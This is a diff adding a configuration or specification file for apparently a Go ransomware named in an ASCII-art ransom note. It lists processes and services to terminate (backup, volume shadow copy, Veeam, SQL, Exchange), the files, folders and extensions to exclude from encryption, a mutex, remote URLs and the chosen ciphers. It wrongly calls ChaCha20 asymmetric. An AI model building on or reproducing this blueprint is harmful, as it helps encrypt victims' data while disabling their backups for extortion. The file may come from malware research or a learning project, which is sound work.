@@ -1,0 +1,31 @@
+version: "1.0"
+
+process list: "thebat", "msaccess", "firefox", "notepad", "ocssd", "encsvc", "dbeng50", "sql", "agntsvc", "isqlplussvc", "xfssvccon", "tbirdconfig", "wordpad", "dbsnmp", "infopath", "powerpnt", "oracle", "ocautoupds", "visio", "excel", "winword", "synctime", "steam", "thunderbird", "sqbcoreservice", "mspub", "ocomm", "onenote", "mydesktopqos", "mydesktopservice", "outlook"
+
+service list: "mepocs","memtas","veeam","svc$","backup","sql","vss","msexchange"
+
+remote url list: "https://chuongdong.com", "http://chuongdong.com"
+
+ransomNoteContent: "  ▄████  ▒█████   ▄████▄   ██▀███ ▓██   ██▓ ██▓███  ▄▄▄█████▓ ▒█████   ██▀███  
+ ██▒ ▀█▒▒██▒  ██▒▒██▀ ▀█  ▓██ ▒ ██▒▒██  ██▒▓██░  ██▒▓  ██▒ ▓▒▒██▒  ██▒▓██ ▒ ██▒
+▒██░▄▄▄░▒██░  ██▒▒▓█    ▄ ▓██ ░▄█ ▒ ▒██ ██░▓██░ ██▓▒▒ ▓██░ ▒░▒██░  ██▒▓██ ░▄█ ▒
+░▓█  ██▓▒██   ██░▒▓▓▄ ▄██▒▒██▀▀█▄   ░ ▐██▓░▒██▄█▓▒ ▒░ ▓██▓ ░ ▒██   ██░▒██▀▀█▄  
+░▒▓███▀▒░ ████▓▒░▒ ▓███▀ ░░██▓ ▒██▒ ░ ██▒▓░▒██▒ ░  ░  ▒██▒ ░ ░ ████▓▒░░██▓ ▒██▒
+ ░▒   ▒ ░ ▒░▒░▒░ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░  ██▒▒▒ ▒▓▒░ ░  ░  ▒ ░░   ░ ▒░▒░▒░ ░ ▒▓ ░▒▓░
+  ░   ░   ░ ▒ ▒░   ░  ▒     ░▒ ░ ▒░▓██ ░▒░ ░▒ ░         ░      ░ ▒ ▒░   ░▒ ░ ▒░
+░ ░   ░ ░ ░ ░ ▒  ░          ░░   ░ ▒ ▒ ░░  ░░         ░      ░ ░ ░ ▒    ░░   ░ 
+      ░     ░ ░  ░ ░         ░     ░ ░                           ░ ░     ░     
+                 ░                 ░ ░                                         
+"
+
+mutexString: "g0_l4nG_1S_FuN_i5nT_1T"
+
+file list: "bootfont.bin", "thumbs.db", "ntldr", "ntuser.dat", "iconcache.db", "autorun.inf", "ntuser.ini", "bootsect.bak", "boot.ini", "ntuser.dat.log", "desktop.ini"
+
+folder list: "program files (x86)", "$windows.~ws", "msocache", "boot", "program files", "application data", "tor browser", "mozilla", "intel", "programdata", "default", "appdata", "all users", "$windows.~bt", "google", "windows", "$recycle.bin", "windows.old", "config.msi", "public", "perflogs", "system volume information"
+
+extension list: "cur", "diagcab", "cab", "idx", "diagcfg", "hlp", "theme", "rtp", "ldf", "msp", "mod", "drv", "lock", "ico", "lnk", "icns", "wpx", "shs", "icl", "msc", "diagpkg", "msu", "adv", "pdb", "mpa", "msstyles", "scr", "key", "dll", "nls", "cmd", "hta", "ocx", "sys", "ics", "ani", "cpl", "deskthemepack", "exe", "386", "themepack", "ps1", "nomedia", "com", "spl", "rom", "bat", "prf", "bin", "msi"
+
+Public key crypto: Curve25519 (translate c to go)
+
+Asymmetric: modified ChaCha20 (own implementation)
